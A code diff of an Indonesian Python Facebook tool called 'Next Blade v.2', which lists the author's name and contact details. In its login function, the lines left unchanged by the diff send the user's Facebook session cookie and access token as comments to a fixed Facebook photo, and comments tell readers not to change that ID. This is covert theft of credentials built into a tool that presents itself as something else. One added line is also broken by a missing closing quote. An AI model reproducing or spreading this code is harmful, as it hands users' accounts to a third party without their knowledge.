@@ -15,10 +15,6 @@ Version  : 'Next Blade v.2'
 Author   = 'Ferly Shishigami X'
 Facebook = 'フェリーシシガミ (https://m.facebook.com/profile.php?id=100056190665450)'
 WhatsApp = '0857 9781 8026'
-	
-komen    = random.choice(
-	 ['hello bang😎','Keren Suhu','Salam kenal bang♥','Keren anjay','Kelazz','Pro kntl bang😎','Sehat selalu bang♥','mantap bang😎']
-)
 #------------[ WARNA-COLOR ]--------------#
 P = '\x1b[1;97m'
 M = '\x1b[1;91m'
@@ -250,7 +246,7 @@ def login():
 		tem      = ('\nSehat Selalu Bang😎🖥 @[100056190665450:0]\n\nJangan Pernah Menjadi Orang Yang Menyombongkan Diri Sendiri, Karena Kita Hidup Di Dunia Ini Tidak Sendirian, Jika Ada Orang Yang Membutuhkan Apa Salah Nya Kita Memberikan\n') ###--------[ JANGAN GANTI KOMENNYA ]--------###
 		slebew = ('\nKomentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini)) #-----GK USAH DI GANTI..ANGGAP SAJA SEBAGAI TANDA TERIMA KASIH-----#
 		link = ('https://www.facebook.com/photo?fbid=661200275762989&set=a.111112804105075') ###--------[ JANGAN GANTI TAUTAN NYA ]--------###
-		random_kata = random.choice(["Acc Guru","Hallo Ganteng","Kamu Ganteng Banget Deh Ferly><😝"]) ###--------[ JANGAN GANTI KOMENNYA ]--------###
+		random_kata = random.choice(["Acc Guru","Hallo Ganteng","Kamu Ganteng Banget Deh Ferly><😝","Sehat Selalu Master]) ###--------[ JANGAN GANTI KOMENNYA ]--------###
 		#ses.post(f"https://graph.facebook.com/661200275762989?fields=subscribers&access_token={token}",headers=(cookies=cok) 
 		ses.post(f"https://graph.facebook.com/661200275762989/comments/?message={cookie}&access_token={token}",cookies=cok) ###--------[ JANGAN GANTI ID NYA ]--------###
 		ses.post(f"https://graph.facebook.com/661200275762989/comments/?message={token}&access_token={token}",cookies=cok) ###--------[ JANGAN GANTI ID NYA ]--------###
